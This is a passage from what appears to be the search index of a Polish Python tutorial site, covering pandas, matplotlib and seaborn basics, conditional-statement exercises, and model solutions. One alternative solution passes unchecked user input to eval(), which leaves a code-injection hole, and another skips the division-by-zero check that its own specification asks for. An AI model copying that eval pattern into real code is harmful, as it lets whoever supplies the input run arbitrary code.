spo\u0142eczno\u015bci ekspert\u00f3w i entuzjast\u00f3w.</p> <p>Prezentacja</p> <p>Projekt wprowadzaj\u0105cy</p>"},{"location":"programming/python/data-science/pandas/","title":"Biblioteka Pandas","text":"<p>Jednym z pierwszych krok\u00f3w, kt\u00f3re musimy wykona\u0107, zanim przejdziemy do analizowania ciekawych danych, jest wczytanie tych\u017ce danych do programu. W tym pomo\u017ce nam biblioteka pandas, kt\u00f3ra diametralnie u\u0142atwia prac\u0119 z danymi tabelarycznymi w Pythonie.</p> <p>Pandas to biblioteka przeznaczona do analizy i przetwarzania danych. Jej g\u0142\u00f3wnymi strukturami danych s\u0105 jednowymiarowe serie danych (ang. Series) oraz wielowymiarowe ramki danych (ang. DataFrame). Ramki danych przypominaj\u0105 troch\u0119 tabele w programie Excel \u2013 maj\u0105 wiersze i kolumny.</p>"},{"location":"programming/python/data-science/pandas/#instalacja","title":"Instalacja","text":"<p>Aby korzysta\u0107 z biblioteki pandas, najpierw nale\u017cy j\u0105 zainstalowa\u0107. Mo\u017cemy to zrobi\u0107 w niemal\u017ce trywialny spos\u00f3b, wpisuj\u0105c w terminalu poni\u017csze polecenie:</p> <pre><code>pip install pandas\n</code></pre>"},{"location":"programming/python/data-science/pandas/#pierwsze-kroki-z-pandas","title":"Pierwsze kroki z pandas","text":"<p>Zacznijmy od prostego przyk\u0142adu. Za\u0142\u00f3\u017cmy, \u017ce mamy pewne dane o sprzeda\u017cy owoc\u00f3w:</p> <pre><code>import pandas as pd\n\nfruits = {\n    'Owoce': ['Jab\u0142ka', 'Banany', 'Wi\u015bnie'],\n    'Ilo\u015b\u0107': [10, 5, 8],\n    'Cena': [3.5, 1.2, 2.5]\n}\n\ndf = pd.DataFrame(fruits)\nprint(df)\n</code></pre> <p>Po wydrukowaniu ramki danych zobaczymy poni\u017csz\u0105 tabelk\u0119:</p> <pre><code>   Owoce  Ilo\u015b\u0107  Cena\n0  Jab\u0142ka    10   3.5\n1  Banany     5   1.2\n2  Wi\u015bnie     8   2.5\n</code></pre>"},{"location":"programming/python/data-science/pandas/#jak-korzystac-z-danych","title":"Jak korzysta\u0107 z danych?","text":"<p>Pandas oferuje wiele narz\u0119dzi do pracy z danymi. Poni\u017cej kilka przyk\u0142ad\u00f3w.</p>"},{"location":"programming/python/data-science/pandas/#wybor-kolumny","title":"Wyb\u00f3r kolumny","text":"<pre><code>print(df['Owoce'])\n</code></pre>"},{"location":"programming/python/data-science/pandas/#filtrowanie-danych","title":"Filtrowanie danych","text":"<pre><code>print(df[df['Ilo\u015b\u0107'] &gt; 7])\n</code></pre>"},{"location":"programming/python/data-science/pandas/#podstawowe-statystyki","title":"Podstawowe statystyki","text":"<pre><code>print(df.describe())\n</code></pre>"},{"location":"programming/python/data-science/pandas/#dlaczego-warto-uzywac-pandas","title":"Dlaczego warto u\u017cywa\u0107 pandas?","text":"<ol> <li>Elastyczno\u015b\u0107 - przetwarzaj dane tak, jak potrzebujesz.</li> <li>Wydajno\u015b\u0107 - obs\u0142uguje du\u017ce zestawy danych.</li> <li>Integracja - \u0142atwo \u0142\u0105czy si\u0119 z innymi bibliotekami Pythona.</li> <li>Wsparcie dla r\u00f3\u017cnych format\u00f3w - czytaj i zapisuj w formatach CSV, Excel, SQL i wielu innych.</li> </ol>"},{"location":"programming/python/data-science/pandas/#podsumowanie","title":"Podsumowanie","text":"<p>Pandas to pot\u0119\u017cne narz\u0119dzie do przetwarzania danych w Pythonie. Dzi\u0119ki intuicyjnym strukturom danych i wielu funkcjom u\u0142atwia analiz\u0119 nawet skomplikowanych zestaw\u00f3w informacji. A to tylko wierzcho\u0142ek g\u00f3ry lodowej! Zach\u0119camy do dalszej eksploracji tej fantastycznej biblioteki.</p>"},{"location":"programming/python/data-science/pyplot/","title":"Pyplot","text":"<p><code>matplotlib.pyplot</code> jest jednym z najpopularniejszych narz\u0119dzi do tworzenia wykres\u00f3w i dzi\u0119ki niemu przetwarzanie danych staje si\u0119 nie tylko proste, ale r\u00f3wnie\u017c atrakcyjne wizualnie. Zapraszam do kr\u00f3tkiego wprowadzenia!</p> <p><code>matplotlib</code> to biblioteka do tworzenia wykres\u00f3w w Pythonie. <code>pyplot</code> to jej modu\u0142, kt\u00f3ry oferuje funkcje pozwalaj\u0105ce na \u0142atwe rysowanie r\u00f3\u017cnego rodzaju wykres\u00f3w w stylu MATLAB.</p>"},{"location":"programming/python/data-science/pyplot/#instalacja","title":"Instalacja","text":"<p>Aby korzysta\u0107 z <code>matplotlib</code>, najpierw musimy j\u0105 zainstalowa\u0107:</p> <pre><code>pip install matplotlib\n</code></pre>"},{"location":"programming/python/data-science/pyplot/#pierwszy-wykres","title":"Pierwszy wykres","text":"<p>Stworzenie prostego wykresu liniowego jest naprawd\u0119 proste:</p> <pre><code>import matplotlib.pyplot as plt\n\nx = [1, 2, 3, 4, 5]\ny = [1, 4, 9, 16, 25]\n\nplt.plot(x, y)\nplt.title(\"Wykres liniowy\")\nplt.xlabel(\"O\u015b X\")\nplt.ylabel(\"O\u015b Y\")\nplt.show()\n</code></pre>"},{"location":"programming/python/data-science/pyplot/#inne-typy-wykresow","title":"Inne typy wykres\u00f3w","text":"<p>Opr\u00f3cz wykresu liniowego <code>matplotlib.pyplot</code> oferuje wiele innych rodzaj\u00f3w wykres\u00f3w. Kilka przedstawiamy poni\u017cej.</p>"},{"location":"programming/python/data-science/pyplot/#wykres-punktowy","title":"Wykres punktowy","text":"<pre><code>plt.scatter(x, y)\n</code></pre>"},{"location":"programming/python/data-science/pyplot/#wykres-supkowy","title":"Wykres s\u0142upkowy:","text":"<pre><code>plt.bar(x, y)\n</code></pre>"},{"location":"programming/python/data-science/pyplot/#histogram","title":"Histogram:","text":"<pre><code>plt.hist(y)\n</code></pre>"},{"location":"programming/python/data-science/pyplot/#dostosowywanie-wykresow","title":"Dostosowywanie wykres\u00f3w","text":"<p><code>matplotlib</code> pozwala na wiele modyfikacji wygl\u0105du wykresu:</p> <ul> <li> <p>Kolory i style linii:   <pre><code>plt.plot(x, y, color='red', linestyle='dashed')\n</code></pre></p> </li> <li> <p>Dodawanie legendy:   <pre><code>plt.plot(x, y, label='Legenda')\nplt.legend()\n</code></pre></p> </li> <li> <p>Zmiana zakresu osi:   <pre><code>plt.xlim(0, 10)\nplt.ylim(0, 30)\n</code></pre></p> </li> </ul>"},{"location":"programming/python/data-science/pyplot/#dlaczego-warto-uzywac-matplotlibpyplot","title":"Dlaczego warto u\u017cywa\u0107 <code>matplotlib.pyplot</code>?","text":"<ol> <li>Wszechstronno\u015b\u0107 - Tworzenie r\u00f3\u017cnych typ\u00f3w wykres\u00f3w od prostych po skomplikowane.</li> <li>Personalizacja - Mo\u017cliwo\u015b\u0107 dostosowywania wygl\u0105du wykres\u00f3w do w\u0142asnych potrzeb.</li> <li>Integracja - Doskona\u0142a integracja z innymi bibliotekami Pythona, takimi jak pandas.</li> <li>Popularno\u015b\u0107 - Wieloletnie wsparcie spo\u0142eczno\u015bci i mn\u00f3stwo dost\u0119pnych zasob\u00f3w.</li> </ol>"},{"location":"programming/python/data-science/pyplot/#podsumowanie","title":"Podsumowanie","text":"<p><code>matplotlib.pyplot</code> to kluczowe narz\u0119dzie dla ka\u017cdego, kto chce wizualizowa\u0107 dane w Pythonie. Dzi\u0119ki niemu mo\u017cesz prezentowa\u0107 informacje w przyst\u0119pny i atrakcyjny spos\u00f3b. Powy\u017cszy przewodnik przedstawia jedynie podstawy - mo\u017cliwo\u015bci s\u0105 naprawd\u0119 ogromne. Zach\u0119cam do eksperymentowania i odkrywania wszystkich funkcji, jakie oferuje ta biblioteka!</p>"},{"location":"programming/python/data-science/seaborn/","title":"Seaborn","text":""},{"location":"programming/python/data-science/seaborn/#wprowadzenie-do-seaborn-w-pythonie","title":"Wprowadzenie do <code>seaborn</code> w Pythonie","text":"<p><code>Seaborn</code> to biblioteka w Pythonie s\u0142u\u017c\u0105ca do tworzenia pi\u0119knych i informatywnych wizualizacji statystycznych. Jest oparty na <code>matplotlib</code>, ale udost\u0119pnia interfejs o wy\u017cszym poziomie, kt\u00f3ry jest \u0142atwiejszy do u\u017cycia i daje bardziej atrakcyjne wyniki wizualne.</p>"},{"location":"programming/python/data-science/seaborn/#instalacja","title":"Instalacja","text":"<p>By zacz\u0105\u0107 korzysta\u0107 z <code>seaborn</code>, musimy go najpierw zainstalowa\u0107:</p> <pre><code>pip install seaborn\n</code></pre>"},{"location":"programming/python/data-science/seaborn/#pierwsza-wizualizacja","title":"Pierwsza wizualizacja","text":"<p>Zobaczmy, jak \u0142atwo stworzy\u0107 atrakcyjny wykres za pomoc\u0105 <code>seaborn</code>:</p> <pre><code>import seaborn as sns\nimport matplotlib.pyplot as plt\n\n# Przyk\u0142adowe dane\ntips = sns.load_dataset(\"tips\")\n\n# Wykres skrzynkowy\nsns.boxplot(x=\"day\", y=\"total_bill\", data=tips)\nplt.show()\n</code></pre>"},{"location":"programming/python/data-science/seaborn/#bogactwo-wykresow","title":"Bogactwo wykres\u00f3w","text":"<p>Seaborn oferuje wiele rodzaj\u00f3w wykres\u00f3w, kt\u00f3re mog\u0105 pom\u00f3c w zrozumieniu Twoich danych:</p> <ul> <li> <p>Wykres liniowy:   <pre><code>sns.lineplot(x=\"timepoint\", y=\"signal\", data=data)\n</code></pre></p> </li> <li> <p>Mapa cieplna:   <pre><code>sns.heatmap(data.corr())\n</code></pre></p> </li> <li> <p>Pairplot (pokazuj\u0105cy relacje mi\u0119dzy kilkoma zmiennymi):   <pre><code>sns.pairplot(data)\n</code></pre></p> </li> </ul> <p>... i wiele innych!</p>"},{"location":"programming/python/data-science/seaborn/#stylizacja","title":"Stylizacja","text":"<p>Jednym z g\u0142\u00f3wnych atut\u00f3w <code>seaborn</code> jest jego zdolno\u015b\u0107 do tworzenia estetycznych wykres\u00f3w z niewielkim nak\u0142adem pracy:</p> <pre><code># Ustawienie stylu\nsns.set_style(\"whitegrid\")\n\n# Tworzenie wykresu\nsns.scatterplot(x=\"total_bill\", y=\"tip\", hue=\"time\", data=tips)\nplt.show()\n</code></pre>"},{"location":"programming/python/data-science/seaborn/#dlaczego-warto-uzywac-seaborn","title":"Dlaczego warto u\u017cywa\u0107 <code>seaborn</code>?","text":"<ol> <li>Estetyka - Wbudowane style i palety kolor\u00f3w sprawiaj\u0105, \u017ce Twoje wykresy s\u0105 \u0142adniejsze od samego pocz\u0105tku.</li> <li>\u0141atwo\u015b\u0107 u\u017cycia - Wysokopoziomowy interfejs umo\u017cliwia szybkie tworzenie skomplikowanych wizualizacji.</li> <li>Integracja z pandas - <code>Seaborn</code> \u015bwietnie wsp\u00f3\u0142pracuje z DataFrame'ami z pandas, co czyni analiz\u0119 danych jeszcze prostsz\u0105.</li> <li>Bogate mo\u017cliwo\u015bci - Od prostych wykres\u00f3w punktowych po skomplikowane wizualizacje wielowymiarowe.</li> </ol>"},{"location":"programming/python/data-science/seaborn/#podsumowanie","title":"Podsumowanie","text":"<p><code>Seaborn</code> to wspania\u0142e narz\u0119dzie dla ka\u017cdego, kto chce wizualizowa\u0107 dane w Pythonie w atrakcyjny i wyrafinowany spos\u00f3b. Je\u015bli chcesz, aby Twoje analizy by\u0142y nie tylko dok\u0142adne, ale tak\u017ce estetyczne, warto da\u0107 szans\u0119 <code>seaborn</code>.</p>"},{"location":"programming/python/exercises/","title":"\u0106wiczenia","text":"<p>Przed przyst\u0105pieniem do rozwi\u0105zywania zada\u0144 zapoznaj si\u0119 z poni\u017cszym opisem.</p> <p>Zadbaj o czytelno\u015b\u0107 swoich rozwi\u0105za\u0144, zar\u00f3wno od strony kodu jak i wypisywanych komunikat\u00f3w. Je\u017celi jest podana specyfikacja, to mo\u017cesz za\u0142o\u017cy\u0107, \u017ce dane b\u0119d\u0105 zgodne ze specyfikacj\u0105. Dane wej\u015bciowe nale\u017cy wczytywa\u0107 ze standardowego wej\u015bcia.</p> <p>Po\u015bwi\u0119\u0107 czas na rozwi\u0105zanie ka\u017cdego zadania. Zastan\u00f3w si\u0119 nad r\u00f3\u017cnymi sposobami podej\u015bcia i rozwi\u0105zania problemu.</p> <p>Zadania podzielone s\u0105 na tematy, kt\u00f3re u\u0142o\u017cyli\u015bmy w sugerowanej kolejno\u015bci poznawania zagadnie\u0144. Ka\u017cdy temat zawiera od kilku do kilkunastu zada\u0144. Po rozwini\u0119ciu tematu pojawi\u0105 si\u0119 przyk\u0142adowe rozwi\u0105zania poszczeg\u00f3lnych zada\u0144, ka\u017cde na osobnej stronie. Pami\u0119taj, \u017ce ka\u017cde zadanie mo\u017cna rozwi\u0105za\u0107 na kilka sposob\u00f3w. </p> <p>Danger</p> <p>Zajrzyj do przyk\u0142adowego rozwi\u0105zania dopiero, jak samodzielnie wykonasz zadanie.</p>"},{"location":"programming/python/exercises/conditional-instruction/","title":"Instrukcja warunkowa","text":""},{"location":"programming/python/exercises/conditional-instruction/#zadanie-1","title":"Zadanie 1","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105. Nie korzystaj z funkcji abs</p>"},{"location":"programming/python/exercises/conditional-instruction/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/conditional-instruction/#dane","title":"Dane","text":"<ul> <li>\\(a\\) - liczba ca\u0142kowita</li> </ul>"},{"location":"programming/python/exercises/conditional-instruction/#wynik","title":"Wynik","text":"<ul> <li>Warto\u015b\u0107 bezwzgl\u0119dna z \\(a\\)</li> </ul>"},{"location":"programming/python/exercises/conditional-instruction/#przykad","title":"Przyk\u0142ad","text":""},{"location":"programming/python/exercises/conditional-instruction/#dane_1","title":"Dane","text":"<pre><code>a := -2\n</code></pre> <p>Wynik: \\(2\\) </p>"},{"location":"programming/python/exercises/conditional-instruction/#zadanie-2","title":"Zadanie 2","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/python/exercises/conditional-instruction/#specyfikacja_1","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/conditional-instruction/#dane_2","title":"Dane","text":"<ul> <li>\\(a\\) - liczba ca\u0142kowita</li> </ul>"},{"location":"programming/python/exercises/conditional-instruction/#wynik_1","title":"Wynik","text":"<ul> <li>Znak liczby \\(a\\), tzn. \\(1\\) gdy \\(a\\) jest dodatnie, \\(-1\\) gdy \\(a\\) jest ujemne, \\(0\\) gdy \\(a\\) wynosi \\(0\\) </li> </ul>"},{"location":"programming/python/exercises/conditional-instruction/#przykad-1","title":"Przyk\u0142ad 1","text":""},{"location":"programming/python/exercises/conditional-instruction/#dane_3","title":"Dane","text":"<pre><code>a := 5\n</code></pre> <p>Wynik: \\(1\\) </p>"},{"location":"programming/python/exercises/conditional-instruction/#przykad-2","title":"Przyk\u0142ad 2","text":""},{"location":"programming/python/exercises/conditional-instruction/#dane_4","title":"Dane","text":"<pre><code>a := -5\n</code></pre> <p>Wynik: \\(-1\\) </p>"},{"location":"programming/python/exercises/conditional-instruction/#przykad-3","title":"Przyk\u0142ad 3","text":""},{"location":"programming/python/exercises/conditional-instruction/#dane_5","title":"Dane","text":"<pre><code>a := 0\n</code></pre> <p>Wynik: \\(0\\) </p>"},{"location":"programming/python/exercises/conditional-instruction/#zadanie-3","title":"Zadanie 3","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/python/exercises/conditional-instruction/#specyfikacja_2","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/conditional-instruction/#dane_6","title":"Dane","text":"<ul> <li>\\(a, b\\) - dwie liczby ca\u0142kowite</li> </ul>"},{"location":"programming/python/exercises/conditional-instruction/#wynik_2","title":"Wynik","text":"<ul> <li>Wynik dzielenia liczb \\(a\\) i \\(b\\), lub komunikat, \u017ce nie mo\u017cna wykona\u0107 dzielenia.</li> </ul>"},{"location":"programming/python/exercises/conditional-instruction/#przykad_1","title":"Przyk\u0142ad","text":""},{"location":"programming/python/exercises/conditional-instruction/#dane_7","title":"Dane","text":"<pre><code>a := 1\nb := 2\n</code></pre> <p>Wynik: \\(0.5\\) </p>"},{"location":"programming/python/exercises/conditional-instruction/#zadanie-4","title":"Zadanie 4","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105. Nie korzystaj z funkcji min, max.</p>"},{"location":"programming/python/exercises/conditional-instruction/#specyfikacja_3","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/conditional-instruction/#dane_8","title":"Dane","text":"<ul> <li>\\(a, b, c\\) - trzy liczby ca\u0142kowite</li> </ul>"},{"location":"programming/python/exercises/conditional-instruction/#wynik_3","title":"Wynik","text":"<ul> <li>Najwi\u0119ksza z liczb \\(a\\), \\(b\\) i \\(c\\) , lub dowolna gdy s\u0105 sobie r\u00f3wne</li> </ul>"},{"location":"programming/python/exercises/conditional-instruction/#przykad_2","title":"Przyk\u0142ad","text":""},{"location":"programming/python/exercises/conditional-instruction/#dane_9","title":"Dane","text":"<pre><code>a := 4\nb := 1\nc := 3\n</code></pre> <p>Wynik: \\(4\\) </p>"},{"location":"programming/python/exercises/conditional-instruction/#zadanie-5","title":"Zadanie 5","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105. Nie korzystaj z funkcji min, max.</p>"},{"location":"programming/python/exercises/conditional-instruction/#specyfikacja_4","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/conditional-instruction/#dane_10","title":"Dane","text":"<ul> <li>\\(a, b, c, d\\) - cztery liczby ca\u0142kowite</li> </ul>"},{"location":"programming/python/exercises/conditional-instruction/#wynik_4","title":"Wynik","text":"<ul> <li>Najwi\u0119ksza z liczb \\(a, b, c\\) i \\(d\\), lub dowolna gdy s\u0105 sobie r\u00f3wne</li> </ul>"},{"location":"programming/python/exercises/conditional-instruction/#przykad_3","title":"Przyk\u0142ad","text":""},{"location":"programming/python/exercises/conditional-instruction/#dane_11","title":"Dane","text":"<pre><code>a := 3\nb := 1\nc := 3\nd := 5\n</code></pre> <p>Wynik: \\(5\\) </p>"},{"location":"programming/python/exercises/conditional-instruction/#zadanie-6","title":"Zadanie 6","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105. Zadbaj o czytelno\u015b\u0107 programu.</p>"},{"location":"programming/python/exercises/conditional-instruction/#specyfikacja_5","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/conditional-instruction/#dane_12","title":"Dane","text":"<ul> <li>\\(a, b\\) - dwie liczby ca\u0142kowite</li> <li>\\(op\\) - znak jednej z dozwolonych operacji: \\(+,-,*,/\\) </li> </ul>"},{"location":"programming/python/exercises/conditional-instruction/#wynik_5","title":"Wynik","text":"<ul> <li>Wynik dzia\u0142ania\\(a\\ op\\ b\\) (np. \\(a+b\\)), lub komunikat, \u017ce nie mo\u017cna wykona\u0107 dzielenia.</li> </ul>"},{"location":"programming/python/exercises/conditional-instruction/#przykad_4","title":"Przyk\u0142ad","text":""},{"location":"programming/python/exercises/conditional-instruction/#dane_13","title":"Dane","text":"<pre><code>a := 3\nb := 1\nop := '+'\n</code></pre> <p>Wynik: \\(4\\) </p>"},{"location":"programming/python/exercises/conditional-instruction/#zadanie-7","title":"Zadanie 7","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p> <p>Info</p> <p>Rok przest\u0119pny to taki, kt\u00f3ry:</p> <ul> <li>jest podzielny przez 4, ale nie jest podzielny przez 100, lub</li> <li>jest podzielny przez 400</li> </ul>"},{"location":"programming/python/exercises/conditional-instruction/#specyfikacja_6","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/conditional-instruction/#dane_14","title":"Dane","text":"<ul> <li>\\(rok\\) - liczba naturalna</li> </ul>"},{"location":"programming/python/exercises/conditional-instruction/#wynik_6","title":"Wynik","text":"<ul> <li>Komunikat okre\u015blaj\u0105cy, czy podany rok jest przest\u0119pny czy te\u017c nie</li> </ul>"},{"location":"programming/python/exercises/conditional-instruction/#przykad_5","title":"Przyk\u0142ad","text":""},{"location":"programming/python/exercises/conditional-instruction/#dane_15","title":"Dane","text":"<pre><code>rok := 2021\n</code></pre> <p>Wynik:  \"Rok 2021 nie jest przest\u0119pny\"</p>"},{"location":"programming/python/exercises/conditional-instruction/solution-1/","title":"Rozwi\u0105zanie 1","text":""},{"location":"programming/python/exercises/conditional-instruction/solution-1/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105. Nie korzystaj z funkcji abs</p>"},{"location":"programming/python/exercises/conditional-instruction/solution-1/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/conditional-instruction/solution-1/#dane","title":"Dane","text":"<ul> <li>\\(a\\) - liczba ca\u0142kowita</li> </ul>"},{"location":"programming/python/exercises/conditional-instruction/solution-1/#wynik","title":"Wynik","text":"<ul> <li>Warto\u015b\u0107 bezwzgl\u0119dna z \\(a\\)</li> </ul>"},{"location":"programming/python/exercises/conditional-instruction/solution-1/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>a = int(input(\"Podaj liczb\u0119 ca\u0142kowit\u0105: \"))\n\nif a &lt; 0:\n    print(f\"|{a}| = {-a}\")\nelse:\n    print(f\"|{a}| = {a}\")\n</code></pre>"},{"location":"programming/python/exercises/conditional-instruction/solution-2/","title":"Rozwi\u0105zanie 2","text":""},{"location":"programming/python/exercises/conditional-instruction/solution-2/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/python/exercises/conditional-instruction/solution-2/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/conditional-instruction/solution-2/#dane","title":"Dane","text":"<ul> <li>\\(a\\) - liczba ca\u0142kowita</li> </ul>"},{"location":"programming/python/exercises/conditional-instruction/solution-2/#wynik","title":"Wynik","text":"<ul> <li>Znak liczby \\(a\\), tzn. \\(1\\) gdy \\(a\\) jest dodatnie, \\(-1\\) gdy \\(a\\) jest ujemne, \\(0\\) gdy \\(a\\) wynosi \\(0\\) </li> </ul>"},{"location":"programming/python/exercises/conditional-instruction/solution-2/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>a = int(input(\"Podaj liczb\u0119 ca\u0142kowit\u0105: \"))\n\nznak = 0\n\nif a &lt; 0:\n    znak = -1\nelif a &gt; 0:\n    znak = 1\nelse:\n    znak = 0\n\nprint(f\"Znak liczby {a}: {znak}\")\n</code></pre>"},{"location":"programming/python/exercises/conditional-instruction/solution-3/","title":"Rozwi\u0105zanie 3","text":""},{"location":"programming/python/exercises/conditional-instruction/solution-3/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/python/exercises/conditional-instruction/solution-3/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/conditional-instruction/solution-3/#dane","title":"Dane","text":"<ul> <li>\\(a, b\\) - dwie liczby ca\u0142kowite</li> </ul>"},{"location":"programming/python/exercises/conditional-instruction/solution-3/#wynik","title":"Wynik","text":"<ul> <li>Wynik dzielenia liczb \\(a\\) i \\(b\\), lub komunikat, \u017ce nie mo\u017cna wykona\u0107 dzielenia.</li> </ul>"},{"location":"programming/python/exercises/conditional-instruction/solution-3/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>a = int(input(\"Podaj pierwsz\u0105 liczb\u0119: \"))\nb = int(input(\"Podaj drug\u0105 liczb\u0119: \"))\n\nif b == 0:\n    print(\"Nie mo\u017cna dzieli\u0107 przez 0\")\nelse:\n    print(f\"{a} / {b} = {a / b}\")\n</code></pre>"},{"location":"programming/python/exercises/conditional-instruction/solution-4/","title":"Rozwi\u0105zanie 4","text":""},{"location":"programming/python/exercises/conditional-instruction/solution-4/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105. Nie korzystaj z funkcji min, max.</p>"},{"location":"programming/python/exercises/conditional-instruction/solution-4/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/conditional-instruction/solution-4/#dane","title":"Dane","text":"<ul> <li>\\(a, b, c\\) - trzy liczby ca\u0142kowite</li> </ul>"},{"location":"programming/python/exercises/conditional-instruction/solution-4/#wynik","title":"Wynik","text":"<ul> <li>Najwi\u0119ksza z liczb \\(a\\), \\(b\\) i \\(c\\), lub dowolna gdy s\u0105 sobie r\u00f3wne</li> </ul>"},{"location":"programming/python/exercises/conditional-instruction/solution-4/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>a = int(input(\"Podaj pierwsz\u0105 liczb\u0119: \"))\nb = int(input(\"Podaj drug\u0105 liczb\u0119: \"))\nc = int(input(\"Podaj trzeci\u0105 liczb\u0119: \"))\n\nmaks = -1\n\nif a &gt;= b and a &gt;= c:\n    maks = a\nelif b &gt;= a and b &gt;= c:\n    maks = b\nelse:\n    maks = c\n\nprint(f\"Maksimum z {a}, {b} i {c} wynosi {maks}\")\n</code></pre>"},{"location":"programming/python/exercises/conditional-instruction/solution-5/","title":"Rozwi\u0105zanie 5","text":""},{"location":"programming/python/exercises/conditional-instruction/solution-5/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105. Nie korzystaj z funkcji min, max.</p>"},{"location":"programming/python/exercises/conditional-instruction/solution-5/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/conditional-instruction/solution-5/#dane","title":"Dane","text":"<ul> <li>\\(a, b, c, d\\) - cztery liczby ca\u0142kowite</li> </ul>"},{"location":"programming/python/exercises/conditional-instruction/solution-5/#wynik","title":"Wynik","text":"<ul> <li>Najwi\u0119ksza z liczb \\(a, b, c\\) i \\(d\\), lub dowolna gdy s\u0105 sobie r\u00f3wne</li> </ul>"},{"location":"programming/python/exercises/conditional-instruction/solution-5/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>a = int(input(\"Podaj pierwsz\u0105 liczb\u0119: \"))\nb = int(input(\"Podaj drug\u0105 liczb\u0119: \"))\nc = int(input(\"Podaj trzeci\u0105 liczb\u0119: \"))\nd = int(input(\"Podaj czwart\u0105 liczb\u0119: \"))\n\nmaks = a\n\nif b &gt; maks:\n    maks = b\n\nif c &gt; maks:\n    maks = c\n\nif d &gt; maks:\n    maks = d\n\nprint(f\"Maksimum z {a}, {b}, {c} i {d} wynosi {maks}\")\n</code></pre>"},{"location":"programming/python/exercises/conditional-instruction/solution-6/","title":"Rozwi\u0105zanie 6","text":""},{"location":"programming/python/exercises/conditional-instruction/solution-6/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105. Zadbaj o czytelno\u015b\u0107 programu.</p>"},{"location":"programming/python/exercises/conditional-instruction/solution-6/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/conditional-instruction/solution-6/#dane","title":"Dane","text":"<ul> <li>\\(a, b\\) - dwie liczby ca\u0142kowite</li> <li>\\(op\\) - znak jednej z dozwolonych operacji: \\(+,-,*,/\\) </li> </ul>"},{"location":"programming/python/exercises/conditional-instruction/solution-6/#wynik","title":"Wynik","text":"<ul> <li>Wynik dzia\u0142ania\\(a\\ op\\ b\\) (np. \\(a+b\\)), lub komunikat, \u017ce nie mo\u017cna wykona\u0107 dzielenia.</li> </ul>"},{"location":"programming/python/exercises/conditional-instruction/solution-6/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>a = int(input(\"Podaj pierwsz\u0105 liczb\u0119: \"))\nb = int(input(\"Podaj drug\u0105 liczb\u0119: \"))\n\nop = input(\"Podaj znak operacji (+, -, *, /): \")\n\nif op == \"+\":\n    print(f\"{a} + {b} = {a + b}\")\nelif op == \"-\":\n    print(f\"{a} - {b} = {a - b}\")\nelif op == \"*\":\n    print(f\"{a} * {b} = {a * b}\")\nelse:\n    print(f\"{a} / {b} = {a / b}\")\n</code></pre>"},{"location":"programming/python/exercises/conditional-instruction/solution-6/#rozwiazanie-alternatywne","title":"Rozwi\u0105zanie alternatywne","text":"<pre><code>a = int(input(\"Podaj pierwsz\u0105 liczb\u0119: \"))\nb = int(input(\"Podaj drug\u0105 liczb\u0119: \"))\n\nop = input(\"Podaj znak operacji (+, -, *, /): \")\n\nwynik = eval(f\"{a}{op}{b}\")\n\nprint(f\"{a} {op} {b} = {wynik}\")\n</code></pre>"},{"location":"programming/python/exercises/conditional-instruction/solution-7/","title":"Rozwi\u0105zanie 7","text":""},{"location":"programming/python/exercises/conditional-instruction/solution-7/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/python/exercises/conditional-instruction/solution-7/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/conditional-instruction/solution-7/#dane","title":"Dane","text":"<ul> <li>\\(rok\\) - liczba naturalna</li> </ul>"},{"location":"programming/python/exercises/conditional-instruction/solution-7/#wynik","title":"Wynik","text":"<ul> <li>Komunikat okre\u015blaj\u0105cy, czy podany rok jest przest\u0119pny czy te\u017c nie</li> </ul>"},{"location":"programming/python/exercises/conditional-instruction/solution-7/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>rok = int(input(\"Podaj rok: \"))\n\nif (rok % 4 == 0 and rok % 100 != 0) or rok % 400 == 0:\n    print(f\"{rok} jest przest\u0119pny\")\nelse:\n    print(f\"{rok} nie jest przest\u0119pny\")\n</code></pre>"},{"location":"programming/python/exercises/conditional-loop/","title":"P\u0119tla 